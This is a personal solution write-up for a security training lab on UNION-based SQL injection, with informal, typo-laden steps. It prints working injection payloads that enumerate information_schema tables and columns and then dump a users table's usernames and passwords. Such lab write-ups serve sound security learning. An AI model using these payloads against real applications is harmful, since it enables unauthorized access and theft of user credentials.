Lab: SQL injection attack, listing the database contents on non-Oracle databases

QUESTION:
    This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

    The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

    To solve the lab, log in as the administrator user. 

=======================================
ANALYSIS:
-GOALS: display column username and password and than login with username administrator with UNION attack in category filter

SIMPLE LOGIC UNION:
- SELECT a, b, c FROM table1

-SOLVE: 
1. We don't know, how many columns are displayed on the web. Use ORDER BY [NUMBER] or ORDER BY 1 to count the number of columns displayed. IF when calculating an error occurs then the column number has been skipped.

2. Use UNION to combine SELECT query with column NULL
3. Select NULL value: ' UNION SELECT NULL,NULL -- "USE SPCASE FOR GENERAL COMMENT"
4. Select table users & merge by commenting the query behind it: ' UNION SELECT NULL, table_name FROM information_schema.tables WHERE lower(table_name) like '%user%' -- "USE SPCASE FOR GENERAL COMMENT"
5. Select column name & merge by commenting the query behind it: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE lower(table_name)='users_mfjyzd' order by 1 -- "SPCAE"
6. Select table name: ' UNION SELECT username_sjnvmg, password_ofqtnw FROM users_mfjyzd order by 1 -- "SPCAE"


FULL LOGIC UNION:
- SELECT a, b, c FROM table1 where category='Gifts' UNION SELECT NULL, table_name FROM information_schema.tables WHERE lower(table_name) like '%user%' -- "SPACE"'
- SELECT a, b, c FROM table1 where category='Gifts' UNION SELECT table_name, column_name FROM information_schema.columns WHERE lower(table_name)='users_mfjyzd' order by 1 -- "SPCAE"'
- SELECT a, b, c FROM table1 where category='Gifts' UNION SELECT username_sjnvmg, password_ofqtnw FROM users_mfjyzd order by 1 -- "SPCAE"'
